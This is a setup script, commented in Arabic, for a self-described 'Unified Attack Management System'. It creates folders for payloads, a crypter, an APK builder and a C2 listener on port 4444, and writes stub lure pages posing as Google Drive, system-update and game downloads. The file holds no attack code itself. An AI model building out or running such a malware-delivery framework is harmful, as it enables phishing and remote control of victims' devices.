# setup.py
"""
إعداد وتثبيت UAMS Framework
"""

import os
import sys
import subprocess
import shutil
from pathlib import Path

def setup_uams():
    """إعداد النظام بالكامل"""
    
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║          UAMS Framework Setup                     ║
    ║    Unified Attack Management System               ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    # التحقق من Python
    if sys.version_info < (3, 7):
        print("[-] Python 3.7 أو أعلى مطلوب")
        sys.exit(1)
    
    print("[+] التحقق من التبعيات...")
    
    # تثبيت المتطلبات
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
        print("[+] تم تثبيت المتطلبات بنجاح")
    except:
        print("[-] فشل تثبيت المتطلبات")
        print("[*] قم بتشغيل: pip install -r requirements.txt")
    
    # إنشاء المجلدات
    print("[+] إنشاء هيكل المجلدات...")
    
    directories = [
        "payloads",
        "generated_pages",
        "c2_listener/logs",
        "c2_listener/commands",
        "builder_engine/templates/base_app",
        "crypter_engine/templates",
        "backend/templates",
        "backend/static",
        "web_server/logs",
        "web_server/ssl",
        "utils"
    ]
    
    for directory in directories:
        Path(directory).mkdir(parents=True, exist_ok=True)
        print(f"  [✓] {directory}")
    
    # إنشاء ملفات قوالب HTML إذا لم تكن موجودة
    templates_dir = "crypter_engine/templates"
    templates = {
        "google_drive.html": "<!DOCTYPE html>\n<!-- Google Drive Template -->",
        "system_update.html": "<!DOCTYPE html>\n<!-- System Update Template -->",
        "game_download.html": "<!DOCTYPE html>\n<!-- Game Download Template -->"
    }
    
    for template_name, content in templates.items():
        template_path = Path(templates_dir) / template_name
        if not template_path.exists():
            template_path.write_text(content, encoding='utf-8')
            print(f"  [✓] {template_name}")
    
    # إنشاء قاعدة بيانات
    print("[+] تهيئة قاعدة البيانات...")
    try:
        from backend.database import UAMSDatabase
        db = UAMSDatabase()
        print("[+] قاعدة البيانات جاهزة")
    except:
        print("[-] خطأ في قاعدة البيانات")
    
    # إنشاء keystore لـ Android
    print("[+] التحقق من أدوات Android...")
    
    android_tools = ['java', 'keytool']
    missing_tools = []
    
    for tool in android_tools:
        try:
            subprocess.run([tool, '-version'], capture_output=True, check=True)
            print(f"  [✓] {tool}")
        except:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"[!] أدوات Android الناقصة: {', '.join(missing_tools)}")
        print("[!] بعض ميزات بناء APK قد لا تعمل")
    
    print("\n" + "="*50)
    print("       ✅ الإعداد اكتمل بنجاح!")
    print("="*50)
    
    print("\n[*] لتشغيل النظام:")
    print("    python run.py")
    
    print("\n[*] أو ابدأ كل مكون على حدة:")
    print("    python backend/app.py        # لوحة التحكم")
    print("    python c2_listener/listener.py # مركز القيادة")
    print("    python web_server/server.py  # خادم الويب")
    
    print("\n[*] الوصول للنظام:")
    print("    Dashboard:  http://localhost:8080")
    print("    Web Server: http://localhost:8000")
    print("    C2 Listener: localhost:4444")
    
    print("\n[*] للاستخدام الأكاديمي فقط!")
    print("[*] كن مسؤولاً في استخدامك للنظام.")

if __name__ == "__main__":
    setup_uams()